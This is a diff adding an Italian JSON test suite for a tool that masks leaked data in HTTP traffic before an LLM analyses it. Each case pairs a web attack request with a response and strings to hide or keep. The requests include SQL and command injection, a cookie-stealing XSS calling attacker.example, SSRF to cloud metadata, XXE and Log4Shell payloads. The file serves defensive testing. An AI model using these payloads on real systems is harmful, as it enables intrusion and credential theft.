@@ -1,0 +1,637 @@
+{
+  "category": "Attacchi web",
+  "description": "Per ogni classe di attacco: il PAYLOAD deve restare intatto (l'LLM deve poterlo analizzare), i DATI ESFILTRATI nella risposta devono sparire. Classi dall'OWASP WSTG: injection (SQL, NoSQL, LDAP, comandi, template, XXE), SSRF, traversal, deserializzazione, JWT, OAuth, smuggling, IDOR, misconfigurazioni e file esposti.",
+  "cases": [
+    {
+      "id": "sqli-union-dump",
+      "description": "SQLi UNION: payload intatto, righe dumpate nascoste",
+      "severity": "critical",
+      "request": "GET /item?id=1' UNION SELECT username,password FROM users-- HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<td>g.bianchi@acme-corp.it</td><td>5f4dcc3b5aa765d61d8327deb882cf99</td>",
+      "must_hide": [
+        "5f4dcc3b5aa765d61d8327deb882cf99",
+        "g.bianchi@acme-corp.it"
+      ],
+      "must_keep": [
+        "UNION SELECT username,password FROM users--"
+      ]
+    },
+    {
+      "id": "sqli-error-based",
+      "description": "SQLi error-based: versione del DBMS utile all'LLM resta",
+      "severity": "high",
+      "request": "GET /item?id=1' AND extractvalue(1,concat(0x7e,version()))-- HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nXPATH syntax error: '~MySQL 5.7.33' for user m.rossi@acme-corp.it",
+      "must_hide": [
+        "m.rossi@acme-corp.it"
+      ],
+      "must_keep": [
+        "MySQL 5.7.33",
+        "' AND extractvalue(1,concat(0x7e,version()))--"
+      ]
+    },
+    {
+      "id": "sqli-time-based",
+      "description": "SQLi time-based: payload intatto",
+      "severity": "low",
+      "request": "GET /item?id=1' AND SLEEP(5)-- HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "must_hide": [],
+      "must_keep": [
+        "1' AND SLEEP(5)--"
+      ]
+    },
+    {
+      "id": "nosqli-operatori",
+      "description": "NoSQL injection: operatori intatti, documento restituito nascosto",
+      "severity": "critical",
+      "request": "POST /api/v1/data HTTP/1.1\nHost: app.acme-corp.it\nContent-Type: application/json\n\n{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+      "response": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"user\":{\"email\":\"l.verdi@acme-corp.it\",\"password\":\"$2b$10$abcdefghijklmnopqrstuuJ0kZ9yXwVvUuTtSsRrQqPpOoNnMmLl\"}}",
+      "must_hide": [
+        "$2b$10$abcdefghijklmnopqrstuuJ0kZ9yXwVvUuTtSsRrQqPpOoNnMmLl",
+        "l.verdi@acme-corp.it"
+      ],
+      "must_keep": [
+        "{\"$ne\":null}"
+      ]
+    },
+    {
+      "id": "xss-riflesso",
+      "description": "XSS riflesso: payload intatto",
+      "severity": "low",
+      "request": "GET /search?q=<svg/onload=alert(document.domain)> HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/html\n\nRisultati per <svg/onload=alert(document.domain)>",
+      "must_hide": [],
+      "must_keep": [
+        "<svg/onload=alert(document.domain)>"
+      ]
+    },
+    {
+      "id": "xss-esfiltrazione-cookie",
+      "description": "Payload che esfiltra i cookie: struttura intatta",
+      "severity": "low",
+      "request": "GET /c?x=<script>fetch('//attacker.example/?c='+document.cookie)</script> HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "must_hide": [],
+      "must_keep": [
+        "fetch('//",
+        "+document.cookie)"
+      ]
+    },
+    {
+      "id": "ssrf-metadata-aws",
+      "description": "SSRF verso i metadata cloud: indirizzo noto leggibile, credenziali nascoste",
+      "severity": "critical",
+      "request": "GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"Code\":\"Success\",\"AccessKeyId\":\"ASIAFAKEFAKEFAKE0000\",\"SecretAccessKey\":\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYFAKEFAKEKEY\",\"Token\":\"IQoJb3JpZ2luX2VjEFAKEFAKETOKEN0000000000\"}",
+      "must_hide": [
+        "ASIAFAKEFAKEFAKE0000",
+        "wJalrXUtnFEMI/K7MDENG/bPxRfiCYFAKEFAKEKEY",
+        "IQoJb3JpZ2luX2VjEFAKEFAKETOKEN0000000000"
+      ],
+      "must_keep": [
+        "169.254.169.254",
+        "/latest/meta-data/iam/security-credentials/"
+      ]
+    },
+    {
+      "id": "ssrf-gcp-metadata",
+      "description": "SSRF GCP: host dei metadata leggibile",
+      "severity": "high",
+      "request": "GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/ HTTP/1.1\nHost: app.acme-corp.it\nMetadata-Flavor: Google\n\n",
+      "must_hide": [],
+      "must_keep": [
+        "metadata.google.internal",
+        "Metadata-Flavor: Google"
+      ]
+    },
+    {
+      "id": "ssrf-localhost",
+      "description": "SSRF verso localhost: leggibile",
+      "severity": "high",
+      "request": "GET /fetch?url=http://127.0.0.1:8080/admin&alt=http://localhost/ HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "must_hide": [],
+      "must_keep": [
+        "127.0.0.1:8080/admin",
+        "localhost"
+      ]
+    },
+    {
+      "id": "ssrf-rete-interna",
+      "description": "SSRF che scopre un host interno: nascosto",
+      "severity": "critical",
+      "request": "GET /fetch?url=http://10.0.12.7:8080/ HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<title>Dashboard [jenkins-01]</title>",
+      "must_hide": [
+        "10.0.12.7",
+        "jenkins-01"
+      ],
+      "known_gap": "Un nome di macchina nel testo libero senza chiave ne' TLD non e' distinguibile da una parola: aggiungilo con Ctrl+Shift+A"
+    },
+    {
+      "id": "xxe-passwd",
+      "description": "XXE che legge /etc/passwd: payload intatto, utenti reali nascosti",
+      "severity": "critical",
+      "request": "POST /xml HTTP/1.1\nHost: app.acme-corp.it\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmrossi:x:1000:1000:Mario Rossi,,,:/home/mrossi:/bin/bash\n",
+      "must_hide": [
+        "mrossi",
+        "Mario Rossi"
+      ],
+      "must_keep": [
+        "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
+        "root:x:0:0:root:/root:/bin/bash",
+        "www-data"
+      ]
+    },
+    {
+      "id": "lfi-traversal",
+      "description": "Path traversal: sequenza ../ intatta",
+      "severity": "critical",
+      "request": "GET /download?f=../../../../etc/passwd&g=..%2f..%2fetc%2fshadow HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmrossi:x:1000:1000:Mario Rossi,,,:/home/mrossi:/bin/bash\n",
+      "must_hide": [
+        "mrossi"
+      ],
+      "must_keep": [
+        "../../../../etc/passwd",
+        "..%2f..%2f"
+      ]
+    },
+    {
+      "id": "lfi-shadow",
+      "description": "Hash di /etc/shadow",
+      "severity": "critical",
+      "request": "GET /download?f=/etc/shadow HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nroot:$6$rounds=5000$saltsalt$Kx7Yw9Zq2vB3nM4lP5oI6uY7tR8eW9qA0sD1fG2hJ3kL4zX5cV6bN7mQ8wE9rT0yU1iO2pA3sD4fG5hJ6kL7:19000:0:99999:7:::\n",
+      "must_hide": [
+        "$6$rounds=5000$saltsalt$",
+        "Kx7Yw9Zq"
+      ],
+      "must_keep": [
+        "root:"
+      ]
+    },
+    {
+      "id": "lfi-web-config",
+      "description": "web.config con connection string",
+      "severity": "critical",
+      "request": "GET /download?f=..\\..\\web.config HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/xml\n\n<connectionStrings><add name=\"Main\" connectionString=\"Data Source=SQLPROD01;Initial Catalog=Paghe;User ID=sa;Password=Pr0dSqlPwd!\" /></connectionStrings>",
+      "must_hide": [
+        "Pr0dSqlPwd!",
+        "SQLPROD01"
+      ],
+      "must_keep": [
+        "<add name=\"Main\""
+      ]
+    },
+    {
+      "id": "rce-id",
+      "description": "Command injection: output di id con utente reale",
+      "severity": "critical",
+      "request": "GET /ping?host=127.0.0.1; id HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nuid=1001(mrossi) gid=1001(mrossi) groups=1001(mrossi),27(sudo)\nuid=0(root) gid=0(root)",
+      "must_hide": [
+        "mrossi"
+      ],
+      "must_keep": [
+        "; id",
+        "uid=0(root)"
+      ]
+    },
+    {
+      "id": "rce-whoami-windows",
+      "description": "Command injection su Windows: whoami",
+      "severity": "critical",
+      "request": "GET /ping?host=x%20%26%20whoami HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nacme\\m.rossi",
+      "must_hide": [
+        "m.rossi"
+      ],
+      "must_keep": [
+        "& whoami"
+      ],
+      "known_gap": "Dominio NetBIOS in minuscolo ('acme\\m.rossi'): il pattern richiede il dominio in maiuscolo per non confondersi con sequenze di escape"
+    },
+    {
+      "id": "rce-ifconfig",
+      "description": "Output di ifconfig: IP e MAC interni",
+      "severity": "high",
+      "request": "GET /ping?host=;ifconfig HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\neth0: inet 10.0.4.21  netmask 255.255.255.0  ether 00:1a:2b:3c:4d:5e",
+      "must_hide": [
+        "10.0.4.21",
+        "00:1a:2b:3c:4d:5e"
+      ]
+    },
+    {
+      "id": "ssti-payload",
+      "description": "SSTI: espressioni di template intatte",
+      "severity": "low",
+      "request": "GET /hello?name={{7*7}}&a=${7*7}&b=<%= 7*7 %> HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nHello 49",
+      "must_hide": [],
+      "must_keep": [
+        "{{7*7}}",
+        "${7*7}",
+        "<%= 7*7 %>"
+      ]
+    },
+    {
+      "id": "ssti-config-dump",
+      "description": "SSTI che stampa la config Flask",
+      "severity": "critical",
+      "request": "GET /hello?name={{config}} HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<Config {'DEBUG': False, 'SECRET_KEY': 'fl4sk-s3cr3t-k3y-0000', 'SQLALCHEMY_DATABASE_URI': 'postgresql://app:pg-pwd-9876@db-prod-01/app'}>",
+      "must_hide": [
+        "fl4sk-s3cr3t-k3y-0000",
+        "pg-pwd-9876"
+      ],
+      "must_keep": [
+        "SECRET_KEY"
+      ]
+    },
+    {
+      "id": "log4shell",
+      "description": "Log4Shell: struttura ${jndi:...} intatta",
+      "severity": "low",
+      "request": "GET / HTTP/1.1\nHost: app.acme-corp.it\nX-Api-Version: ${jndi:ldap://x.oastify.com/a}\n\n",
+      "must_hide": [],
+      "must_keep": [
+        "${jndi:ldap://"
+      ]
+    },
+    {
+      "id": "deserializzazione-java",
+      "description": "Payload Java serializzato senza dati sensibili: leggibile per l'analisi",
+      "severity": "low",
+      "request": "POST /api/import HTTP/1.1\nHost: app.acme-corp.it\nContent-Type: application/x-www-form-urlencoded\n\npayload=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3Rvcg",
+      "must_hide": [],
+      "must_keep": [
+        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3Rvcg"
+      ]
+    },
+    {
+      "id": "jwt-alg-none",
+      "description": "JWT alg:none con claims innocui: interamente leggibile (non c'e' firma da proteggere)",
+      "severity": "medium",
+      "request": "GET / HTTP/1.1\nHost: app.acme-corp.it\nAuthorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.\n\n",
+      "must_hide": [],
+      "must_keep": [
+        "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
+      ]
+    },
+    {
+      "id": "open-redirect",
+      "description": "Open redirect: parametro e schema intatti",
+      "severity": "low",
+      "request": "GET /login?next=//attacker.example/ HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "must_hide": [],
+      "must_keep": [
+        "next=",
+        "//"
+      ]
+    },
+    {
+      "id": "crlf-injection",
+      "description": "CRLF injection nell'URL: sequenza intatta",
+      "severity": "low",
+      "request": "GET /r?u=/%0d%0aSet-Cookie:%20x=1 HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "must_hide": [],
+      "must_keep": [
+        "%0d%0aSet-Cookie:%20x=1"
+      ]
+    },
+    {
+      "id": "host-header-injection",
+      "description": "Host header injection / cache poisoning",
+      "severity": "low",
+      "request": "GET / HTTP/1.1\nHost: app.acme-corp.it\nX-Forwarded-Host: attacker.example\n\n",
+      "must_hide": [],
+      "must_keep": [
+        "X-Forwarded-Host:"
+      ]
+    },
+    {
+      "id": "smuggling-cl-te",
+      "description": "Request smuggling CL.TE: framing intatto",
+      "severity": "high",
+      "request": "POST / HTTP/1.1\nHost: app.acme-corp.it\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nGPOST / HTTP/1.1\n",
+      "must_hide": [],
+      "must_keep": [
+        "0\n\nGPOST / HTTP/1.1"
+      ]
+    },
+    {
+      "id": "smuggling-te-obfuscated",
+      "description": "Transfer-Encoding offuscato",
+      "severity": "high",
+      "request": "POST / HTTP/1.1\nHost: app.acme-corp.it\nTransfer-Encoding: xchunked\nTransfer-Encoding : chunked\nContent-Length: 4\n\n5c\nGPOST / HTTP/1.1\n\n0\n\n",
+      "must_hide": [],
+      "must_keep": [
+        "Transfer-Encoding: xchunked",
+        "Transfer-Encoding : chunked"
+      ]
+    },
+    {
+      "id": "idor-dati-altrui",
+      "description": "IDOR: ID leggibili, dati dell'altro utente nascosti",
+      "severity": "critical",
+      "request": "GET /api/users/1002/invoices HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"owner\":{\"fullName\":\"Franca Neri\",\"email\":\"f.neri@acme-corp.it\"},\"total\":120}",
+      "must_hide": [
+        "Franca Neri",
+        "f.neri@acme-corp.it"
+      ],
+      "must_keep": [
+        "/api/users/1002/invoices"
+      ]
+    },
+    {
+      "id": "mass-assignment",
+      "description": "Mass assignment: campi di privilegio intatti",
+      "severity": "low",
+      "request": "POST /api/v1/data HTTP/1.1\nHost: app.acme-corp.it\nContent-Type: application/json\n\n{\"name\":\"x\",\"role\":\"admin\",\"isAdmin\":true}",
+      "must_hide": [],
+      "must_keep": [
+        "\"role\":\"admin\"",
+        "\"isAdmin\":true"
+      ]
+    },
+    {
+      "id": "prototype-pollution",
+      "description": "Prototype pollution: chiavi speciali intatte",
+      "severity": "low",
+      "request": "POST /api/v1/data HTTP/1.1\nHost: app.acme-corp.it\nContent-Type: application/json\n\n{\"__proto__\":{\"isAdmin\":true},\"constructor\":{\"prototype\":{\"x\":1}}}",
+      "must_hide": [],
+      "must_keep": [
+        "\"__proto__\"",
+        "\"constructor\""
+      ]
+    },
+    {
+      "id": "graphql-introspection",
+      "description": "Introspezione GraphQL intatta",
+      "severity": "low",
+      "request": "POST /api/v1/data HTTP/1.1\nHost: app.acme-corp.it\nContent-Type: application/json\n\n{\"query\":\"{__schema{types{name}}}\"}",
+      "must_hide": [],
+      "must_keep": [
+        "__schema",
+        "types{name}"
+      ]
+    },
+    {
+      "id": "ldap-injection",
+      "description": "LDAP injection: filtro intatto, voci restituite nascoste",
+      "severity": "critical",
+      "request": "GET /search?u=*)(uid=*))(|(uid=* HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\ncn=Mario Rossi,ou=People,dc=acmecorp,dc=it",
+      "must_hide": [
+        "Mario Rossi",
+        "dc=acmecorp"
+      ],
+      "must_keep": [
+        "*)(uid=*))(|(uid=*"
+      ]
+    },
+    {
+      "id": "actuator-env",
+      "description": "Spring Actuator /env: valore accanto al nome della proprieta'",
+      "severity": "critical",
+      "request": "GET /actuator/env HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"propertySources\":[{\"properties\":[{\"name\":\"spring.datasource.password\",\"value\":\"S3cr3tDbPwd!\"}]}]}",
+      "must_hide": [
+        "S3cr3tDbPwd!"
+      ],
+      "must_keep": [
+        "spring.datasource.password"
+      ]
+    },
+    {
+      "id": "actuator-env-oggetto",
+      "description": "Spring Actuator /env, forma con oggetto",
+      "severity": "critical",
+      "request": "GET /actuator/env HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"spring.datasource.password\":{\"value\":\"S3cr3tDbPwd!\",\"origin\":\"application.yml\"}}",
+      "must_hide": [
+        "S3cr3tDbPwd!"
+      ]
+    },
+    {
+      "id": "phpinfo",
+      "description": "phpinfo(): email e percorsi del cliente",
+      "severity": "high",
+      "request": "GET /phpinfo.php HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<tr><td>SERVER_ADMIN</td><td>webmaster@acme-corp.it</td></tr><tr><td>DOCUMENT_ROOT</td><td>/var/www/acme-corp</td></tr>",
+      "must_hide": [
+        "webmaster@acme-corp.it",
+        "acme-corp"
+      ],
+      "must_keep": [
+        "DOCUMENT_ROOT"
+      ]
+    },
+    {
+      "id": "git-config-esposto",
+      "description": ".git/config esposto con credenziali",
+      "severity": "critical",
+      "request": "GET /.git/config HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\n[remote \"origin\"]\n\turl = https://mrossi:ghp_FAKEfakeFAKEfakeFAKEfake0000@github.com/acme-corp/portal.git\n[user]\n\temail = m.rossi@acme-corp.it\n",
+      "must_hide": [
+        "ghp_FAKEfakeFAKEfakeFAKEfake0000",
+        "acme-corp",
+        "mrossi"
+      ],
+      "must_keep": [
+        "[remote \"origin\"]"
+      ]
+    },
+    {
+      "id": "git-config-nome",
+      "description": ".git/config: nome dell'autore",
+      "severity": "high",
+      "request": "GET /.git/config HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\n[user]\n\tname = Mario Rossi\n",
+      "must_hide": [
+        "Mario Rossi"
+      ]
+    },
+    {
+      "id": "presigned-s3",
+      "description": "URL S3 prefirmato",
+      "severity": "critical",
+      "request": "GET /f?u=https://bucket.s3.amazonaws.com/a.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256%26X-Amz-Credential=AKIAIOSFODNN7EXAMPLE%2F20240101%2Fus-east-1%2Fs3%2Faws4_request%26X-Amz-Signature=fe5f80f77d5fa3beca038a248ff027d0445342fe2855ddc963176630326f1024 HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "must_hide": [
+        "AKIAIOSFODNN7EXAMPLE",
+        "fe5f80f77d5fa3beca038a248ff027d0445342fe2855ddc963176630326f1024"
+      ],
+      "must_keep": [
+        "X-Amz-Algorithm=AWS4-HMAC-SHA256"
+      ]
+    },
+    {
+      "id": "azure-sas",
+      "description": "Token SAS di Azure",
+      "severity": "critical",
+      "request": "GET /blob/a.pdf?sv=2022-11-02&ss=b&sp=r&sig=FAKEsigFAKEsig0000FAKEsig0000%3D HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "must_hide": [
+        "FAKEsigFAKEsig0000FAKEsig0000%3D"
+      ],
+      "must_keep": [
+        "sv=2022-11-02"
+      ]
+    },
+    {
+      "id": "oauth-code",
+      "description": "Authorization code OAuth nel redirect",
+      "severity": "critical",
+      "request": "GET /cb?code=SplxlOBeZQQYbYS6WxSbIA&state=xyz HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "must_hide": [
+        "SplxlOBeZQQYbYS6WxSbIA"
+      ],
+      "must_keep": [
+        "state=xyz"
+      ]
+    },
+    {
+      "id": "cors-riflesso",
+      "description": "CORS riflesso: header di policy intatti",
+      "severity": "low",
+      "request": "GET / HTTP/1.1\nHost: app.acme-corp.it\nOrigin: https://attacker.example\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/plain\nAccess-Control-Allow-Origin: https://attacker.example\nAccess-Control-Allow-Credentials: true\n\n",
+      "must_hide": [],
+      "must_keep": [
+        "Access-Control-Allow-Credentials: true"
+      ]
+    },
+    {
+      "id": "basic-realm",
+      "description": "Realm di Basic auth col nome del cliente",
+      "severity": "high",
+      "request": "GET / HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 401 Unauthorized\nContent-Type: text/plain\nWWW-Authenticate: Basic realm=\"ACME Intranet\"\n\n",
+      "must_hide": [
+        "ACME Intranet"
+      ]
+    },
+    {
+      "id": "enum-utenti",
+      "description": "Enumerazione utenti: messaggio d'errore con username",
+      "severity": "medium",
+      "request": "POST /login HTTP/1.1\nHost: app.acme-corp.it\nContent-Type: application/x-www-form-urlencoded\n\nuser=mario.rossi&pass=x",
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nL'utente mario.rossi non esiste",
+      "must_hide": [
+        "mario.rossi"
+      ]
+    },
+    {
+      "id": "upload-nome-file",
+      "description": "Upload: il nome file del multipart diventa FILENAME_n",
+      "severity": "medium",
+      "request": "POST /upload HTTP/1.1\nHost: app.acme-corp.it\nContent-Type: multipart/form-data; boundary=B\n\n--B\nContent-Disposition: form-data; name=\"cv\"; filename=\"cv_mario_rossi.pdf\"\nContent-Type: application/pdf\n\n%PDF-1.4\n--B--\n",
+      "must_hide": [
+        "mario_rossi"
+      ],
+      "must_keep": [
+        "filename="
+      ]
+    },
+    {
+      "id": "docker-config",
+      "description": "Credenziali di registry Docker",
+      "severity": "critical",
+      "request": "GET / HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"auths\":{\"registry.acme-corp.it\":{\"auth\":\"Y2ktYm90OlIzZzFzdHJ5UHdk\"}}}",
+      "must_hide": [
+        "Y2ktYm90OlIzZzFzdHJ5UHdk"
+      ]
+    },
+    {
+      "id": "kubeconfig",
+      "description": "kubeconfig con token",
+      "severity": "critical",
+      "request": "GET / HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: application/yaml\n\nusers:\n- name: admin\n  user:\n    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IkZBS0UifQ.eyJzdWIiOiJzYTpkZWZhdWx0In0.FAKEsig\n",
+      "must_hide": [
+        "eyJhbGciOiJSUzI1NiIsImtpZCI6IkZBS0UifQ.eyJzdWIiOiJzYTpkZWZhdWx0In0.FAKEsig"
+      ]
+    },
+    {
+      "id": "gcp-service-account",
+      "description": "Chiave di service account GCP",
+      "severity": "critical",
+      "request": "GET / HTTP/1.1\nHost: app.acme-corp.it\n\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"type\":\"service_account\",\"project_id\":\"acme-prod\",\"private_key\":\"-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCfakefakefake\\n-----END PRIVATE KEY-----\\n\",\"client_email\":\"deploy@acme-prod.iam.gserviceaccount.com\"}",
+      "must_hide": [
+        "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC",
+        "deploy@acme-prod.iam.gserviceaccount.com"
+      ],
+      "must_keep": [
+        "\"type\":\"service_account\""
+      ]
+    },
+    {
+      "id": "jwt-claims-leggibili",
+      "description": "JWT con claims innocui: header e claims leggibili, firma nascosta",
+      "severity": "high",
+      "request": "GET / HTTP/1.1\nHost: app.acme-corp.it\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTk5OTk5OTk5fQ.sIgNaTuReFAKEfakeFAKE0000\n\n",
+      "must_hide": [
+        "sIgNaTuReFAKEfakeFAKE0000"
+      ],
+      "must_keep": [
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTk5OTk5OTk5fQ."
+      ]
+    },
+    {
+      "id": "jwt-claims-pii",
+      "description": "JWT con email nei claims: header leggibile, claims e firma nascosti",
+      "severity": "critical",
+      "request": "GET / HTTP/1.1\nHost: app.acme-corp.it\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Im0ucm9zc2lAYWNtZS1jb3JwLml0Iiwicm9sZSI6InVzZXIifQ.sIgNaTuReFAKEfakeFAKE0000\n\n",
+      "must_hide": [
+        "eyJlbWFpbCI6Im0ucm9zc2lAYWNtZS1jb3JwLml0Iiwicm9sZSI6InVzZXIifQ",
+        "sIgNaTuReFAKEfakeFAKE0000"
+      ],
+      "must_keep": [
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
+      ]
+    },
+    {
+      "id": "jwt-header-jku",
+      "description": "JWT con jku verso il dominio del cliente: header nascosto",
+      "severity": "critical",
+      "request": "GET / HTTP/1.1\nHost: app.acme-corp.it\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXV0aC5hY21lLWNvcnAuaXQvandrcy5qc29uIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTk5OTk5OTk5fQ.sIgNaTuReFAKEfakeFAKE0000\n\n",
+      "must_hide": [
+        "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXV0aC5hY21lLWNvcnAuaXQvandrcy5qc29uIn0"
+      ]
+    },
+    {
+      "id": "jwt-in-cookie",
+      "description": "JWT in un cookie: claims leggibili, firma nascosta",
+      "severity": "high",
+      "request": "GET / HTTP/1.1\nHost: app.acme-corp.it\nCookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTk5OTk5OTk5fQ.sIgNaTuReFAKEfakeFAKE0000\n\n",
+      "must_hide": [
+        "sIgNaTuReFAKEfakeFAKE0000"
+      ],
+      "must_keep": [
+        "eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTk5OTk5OTk5fQ"
+      ]
+    },
+    {
+      "id": "serializzato-con-dati",
+      "description": "Oggetto Java serializzato che contiene un'email: nascosto",
+      "severity": "critical",
+      "request": "POST /api/import HTTP/1.1\nHost: app.acme-corp.it\nContent-Type: application/x-www-form-urlencoded\n\npayload=rO0ABXQAGG1hcmlvLnJvc3NpQGFjbWUtY29ycC5pdA==",
+      "must_hide": [
+        "rO0ABXQAGG1hcmlvLnJvc3NpQGFjbWUtY29ycC5pdA=="
+      ]
+    },
+    {
+      "id": "serializzato-cookie",
+      "description": "Oggetto serializzato in un cookie: resta una credenziale, nascosto",
+      "severity": "high",
+      "request": "GET / HTTP/1.1\nHost: app.acme-corp.it\nCookie: rememberMe=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3Rvcg\n\n",
+      "must_hide": [
+        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3Rvcg"
+      ]
+    }
+  ]
+}
